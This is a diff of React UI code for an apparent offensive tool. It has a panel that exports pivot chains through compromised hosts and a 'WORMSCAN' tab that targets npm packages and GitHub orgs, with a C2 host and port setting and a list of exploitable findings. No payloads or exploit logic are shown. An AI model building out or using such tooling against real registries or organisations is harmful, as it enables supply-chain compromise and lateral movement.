+                const c = pivotNodes.filter(n=>n.status===s).length;
+                if (c===0) return null;
+                return (
+                  <div key={s} className="flex items-center gap-2">
+                    <div className="w-1.5 h-1.5 rounded-full shrink-0" style={{background:pivotColor[s]}}/>
+                    <span className="text-[9px] flex-1" style={{color:pivotColor[s]}}>{pivotLabel[s]}</span>
+                    <span className="text-[9px] text-zinc-500">{c}</span>
+                  </div>
+                );
+              })}
+              {pivotEdges.length > 0 && (
+                <div className="flex items-center gap-2 pt-1 border-t border-white/[.04]">
+                  <span className="text-[9px] text-zinc-600 flex-1">Edges</span>
+                  <span className="text-[9px] text-zinc-500">{pivotEdges.length}</span>
+                </div>
+              )}
+            </div>
+
+            {/* Pivot chains export */}
+            {pivotNodes.some(n=>n.status==="compromised"||n.status==="ssh-open") && (
+              <div className="p-3 space-y-2">
+                <div className="text-[9px] text-zinc-500 uppercase tracking-widest">Pivot Chains</div>
+                <div className="space-y-1 max-h-40 overflow-y-auto">
+                  {pivotNodes.filter(n=>n.status==="compromised"||n.status==="ssh-open").map(n => {
+                    const chain: string[] = [];
+                    let cur: PivotNode | undefined = n;
+                    while (cur) {
+                      chain.unshift(`${cur.user??"?"}@${cur.host}`);
+                      cur = pivotNodes.find(p=>p.id===cur?.via);
+                    }
+                    return (
+                      <div key={n.id} className="text-[8px] text-red-400 font-mono bg-red-950/10 border border-red-900/20 px-2 py-1 break-all">
+                        {chain.join(" →\n")}
+                      </div>
+                    );
+                  })}
+                </div>
+                <button onClick={()=>navigator.clipboard.writeText(pivotExportChains()).catch(()=>{})}
+                  className="w-full text-[9px] py-1 border border-zinc-800 text-zinc-500 hover:text-zinc-300 uppercase tracking-widest">
+                  ↓ Export Chains
+                </button>
+              </div>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* ── WORMSCAN TAB ──────────────────────────────────────── */}
+      {tab === "wormscan" && (
+        <div className="flex flex-1 min-h-0 overflow-hidden">
+          <div className="w-52 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
+            <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Target Package</label>
+            <input value={wormPkg} onChange={e=>setWormPkg(e.target.value)} placeholder="e.g. lodash" disabled={wormRunning}
+              className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
+            <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mt-2">GitHub Org</label>
+            <input value={wormOrg} onChange={e=>setWormOrg(e.target.value)} placeholder="e.g. acmecorp" disabled={wormRunning}
+              className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
+            <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mt-2">GitHub Repo (opt)</label>
+            <input value={wormRepo} onChange={e=>setWormRepo(e.target.value)} placeholder="e.g. api-gateway" disabled={wormRunning}
+              className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
+            <div className="text-[9px] text-zinc-700 border-t border-white/[.04] pt-3">
+              <p>C2: {cbHost||"LHOST"}:{cbPort||"9999"}</p>
+              <p className="text-[8px] text-zinc-800 mt-1">Configured in header ↑</p>
+            </div>
+            <div className="flex gap-2 pt-1">
+              <button onClick={startWormScan} disabled={wormRunning || (!wormPkg.trim() && !wormOrg.trim())}
+                className="flex-1 py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40"
+                style={{background:wormRunning?"transparent":"rgba(220,38,38,.15)",borderColor:wormRunning?"rgba(255,255,255,.07)":"rgba(220,38,38,.5)",color:wormRunning?"#52525b":"#f87171"}}>
+                {wormRunning
+                  ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin"/>Scanning…</span>
+                  : "► WORMSCAN"}
+              </button>
+              {wormRunning && <button onClick={stopWormScan} className="px-3 border border-zinc-800 text-zinc-500 hover:text-red-400 text-[10px]">■</button>}
+            </div>
+          </div>
+
+          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
+            {wormProgress && (
+              <div className="border-b border-white/[.04] px-4 py-2 flex items-center gap-3 shrink-0 bg-black/30">
+                <div className="flex-1 bg-zinc-900 h-1.5 rounded-full overflow-hidden">
+                  <div className="h-full bg-red-700 transition-all duration-300" style={{width:`${wormProgress.pct}%`}} />
+                </div>
+                <span className="text-[9px] text-zinc-500 w-8 text-right">{wormProgress.pct}%</span>
+                <span className="text-[9px] text-zinc-600 truncate max-w-[200px]">{wormProgress.label}</span>
+              </div>
+            )}
+
+            <div ref={wormLogRef} className="border-b border-white/[.04] bg-black/80 px-4 py-3 overflow-y-auto"
+              style={{height: wormResults.length === 0 ? "100%" : "9rem"}}>
+              {wormLogs.length === 0 && !wormRunning && (
+                <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2">
+                  <span className="text-4xl opacity-20">⛓</span>
+                  <p className="text-[10px] uppercase tracking-widest">Configure targets and launch WORMSCAN</p>
+                  <p className="text-[9px] text-zinc-800">Streams live results from the supply-chain scanner</p>
+                </div>
+              )}
+              {wormLogs.map((l,i) => (
+                <div key={i} className={`text-[9px] font-mono leading-[1.5] ${l.level==="error"?"text-red-400":l.level==="warn"?"text-orange-300":l.level==="success"?"text-green-400":"text-zinc-500"}`}>
+                  <span className="text-zinc-700 mr-2">{new Date(l.ts).toLocaleTimeString()}</span>{l.msg}
+                </div>
+              ))}
+              {wormRunning && <div className="text-[9px] text-red-700 animate-pulse mt-1">● scanning live registries…</div>}
+            </div>
+
+            {wormResults.length > 0 && (
+              <div className="flex-1 overflow-y-auto p-3 space-y-2 min-h-0">
+                <div className="flex items-center gap-4 mb-2 text-[9px]">
+                  <span className="text-zinc-600 uppercase tracking-widest">{wormResults.length} findings</span>
+                  <span className="text-red-400">{wormResults.filter(r=>r.severity==="critical").length} critical</span>
+                  <span className="text-orange-400">{wormResults.filter(r=>r.severity==="high").length} high</span>
+                  <span className="text-green-400 ml-auto">{wormResults.filter(r=>r.status==="success").length} exploitable</span>
+                </div>
+                {wormResults.map((r,i) => (
+                  <div key={i} className={`border p-3 text-[10px] transition-all ${r.severity==="critical"?"border-red-900/50 bg-red-950/10":r.severity==="high"?"border-orange-900/40 bg-orange-950/10":"border-zinc-800"}`}>
+                    <div className="flex items-center gap-2 mb-1">
+                      <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border flex-shrink-0 ${SEV[r.severity]??SEV["medium"]}`}>{r.severity}</span>
+                      <span className="text-white font-bold truncate">{r.name}</span>
+                      <span className={`text-[8px] px-1.5 border ml-auto flex-shrink-0 ${r.status==="success"?"text-green-400 border-green-900":"text-zinc-500 border-zinc-700"}`}>{r.status.toUpperCase()}</span>
+                    </div>
+                    <div className="text-zinc-500 mt-0.5">[{r.category}] {r.detail}</div>
+                    {r.payload && <div className="mt-1.5 text-[9px] text-cyan-500 font-mono truncate border border-cyan-900/30 bg-cyan-950/10 px-2 py-1">{r.payload.slice(0,150)}</div>}
+                  </div>
+                ))}
               </div>
             )}
           </div>
